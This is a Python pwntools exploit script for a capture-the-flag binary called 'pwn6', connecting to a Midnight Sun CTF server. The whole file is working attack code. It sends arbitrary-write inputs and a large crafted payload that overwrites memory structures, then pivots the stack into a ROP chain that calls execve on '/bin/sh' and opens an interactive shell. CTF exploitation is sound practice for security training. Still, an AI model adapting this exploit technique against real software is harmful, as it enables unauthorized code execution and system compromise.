from pwn import *

#p = process("./pwn6")
p = remote("pwn6-01.play.midnightsunctf.se",10006)

go = lambda x : p.sendlineafter(":",x)
go("0x6d7333:7")


movrsprbx_ret = 0x488D68
pop_rdi = 0x00000000004006a6
pop_rsi = 0x0000000000410433
pop_rdx = 0x0000000000449af5
pop_rax = 0x00000000004158a4
syscall = 0x000000000047d545

go("0x6d55c1:7")

pay  = "1:8\x00\x00"  + p64(0x00000000006d7d40)
pay += p64(0x00000001000000b2) + p64(0x006d566000000000) + p64(0) * 3
pay += p64(0xffffff0000000000) + p64(0) * 2
pay += p64(0x0a6d6fe000000000) + p64(0x00000000006d6fe0)

pay += "\x00" * (0x6d6a40 - 0x6d5603 - len(pay))

pay += p64(0x00000000006d2220)+p64(0x00000000006d3620)
pay += p64(0x00000000006d36a0)+p64(0x00000000006d3f20)
pay += p64(0x00000000006d3460)+p64(0x00000000006d33e0)
pay += p64(0x0000000000000000)+p64(0x00000000006d3be0)
pay += p64(0x00000000006d3c40)+p64(0x00000000006d3cc0)
pay += p64(0x00000000006d3d80)+p64(0x00000000006d3e00)
pay += p64(0x00000000006d3e60)+p64(0x00000000004b4140)
pay += p64(0x00000000004b3240)+p64(0x00000000004b3840)
pay += p64(0x00000000004b123c)+p64(0x00000000004b123c)
pay += p64(0x00000000004b123c)+p64(0x00000000004b123c)
pay += p64(0x00000000004b123c)+p64(0x00000000004b123c)
pay += p64(0x00000000004b123c)+p64(0x00000000004b123c)
pay += p64(0x00000000004b123c)+p64(0x00000000004b123c)
pay += p64(0x00000000004b123c)+p64(0x00000000004b123c)
pay += p64(0x00000000004b123c)+p64(0x000000080000037f)
pay += p64(0x0000000000000000)+p64(0x0000000000000000)
pay += p64(0x000000000048a740)+p64(0x000000000048a510)
pay += p64(0x000000000048a480)+p64(0x000000000048a5d0)
pay += p64(0x00000000004a2000)+p64(0x00000000004a2090)
pay += p64(0x00000000004a20e0)+p64(0x00000000004a21b0)
pay += p64(0x0000000000496150)+p64(0x0000000000496580)
pay += p64(0x0000000000496590)+p64(0x00000000004966b0)
pay += p64(0x0000000000496780)+p64(0x0000000000000000)
pay += p64(0x0000000000000000)+p64(0x0000000000000000)
pay += p64(0x0000000000000000)+p64(0xffffffffffffffff)
pay += p64(0x00000000004a9bc0)+p64(0x00000000004a9dd0)
pay += p64(0x00000000004a9fe0)+p64(0x00000000004aa280)
pay += p64(0x00000000004aa2b0)+p64(0x00000000004aa310)
pay += p64(0x00000000004aab00)+p64(0x00000000004aabe0)
pay += p64(0x00000000004aad20)+p64(0x0000000000000000)
pay += "A" * (0x6d72c8 - 0x6d6c20)
pay += p64(movrsprbx_ret)
pay += "C" * 0x28
pay += p64(pop_rdi)
pay += p64(0x6d7340)
pay += p64(pop_rsi)
pay += p64(0)
pay += p64(pop_rdx)
pay += p64(0)
pay += p64(pop_rax)
pay += p64(59)
pay += p64(syscall)
pay += "/bin/sh\x00"

print hex(len(pay))

go(pay)
p.interactive()